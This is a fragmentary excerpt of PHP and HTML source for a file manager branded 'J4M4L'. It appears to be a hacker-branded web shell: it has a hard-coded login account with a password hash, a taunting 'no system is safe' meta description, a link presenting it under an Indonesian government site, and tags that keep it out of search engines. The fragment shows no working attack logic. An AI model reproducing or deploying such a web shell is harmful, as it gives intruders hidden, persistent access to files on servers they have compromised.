...
$use_auth = true;
$auth_users = array(
    'ribet' => '$2y$10$.BwzvzxJSWKZ1EeDjMQp5eeVc2tPYQ.zK6s76wAya3O6wI8hj58ya', 
);
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">J4M4L @ 2024</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://www.kominfo.go.id/" target="_blank" class="app-v-title"> File Manager J4M4L <?php echo VERSION; ?></a></h3></p>
...
<head>
    ...
    <meta name="description" content="Welcome to J4M4L, no system is safe please call your mom!">
    <meta name="author" content="J4M4L @2024">
...
<head>
    ...
    <meta name="author" content="J4M4L @2023">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
    <title><?php echo fm_enc(APP_TITLE) ?></title>
